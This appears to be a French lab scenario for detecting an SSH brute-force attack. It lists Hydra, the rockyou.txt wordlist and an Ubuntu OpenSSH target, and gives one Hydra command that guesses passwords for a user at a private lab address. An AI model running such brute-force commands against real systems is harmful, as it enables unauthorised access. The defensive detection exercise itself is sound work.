# Scénario 3 : Attaque Brute Force SSH

## Objectif
Détecter une tentative d'intrusion par dictionnaire visant à deviner le mot de passe d'un utilisateur système.

## Outils utilisés
- **Attaquant :** Hydra (sur Kali Linux)
- **Liste de mots de passe :** rockyou.txt
- **Cible :** Service OpenSSH sur Ubuntu

## Simulation de l'Attaque
Lancement d'une attaque automatisée rapide :

**Commande Hydra :**
```bash
hydra -l vboxuser -P /usr/share/wordlists/rockyou.txt ssh://192.168.11.194 -t 4
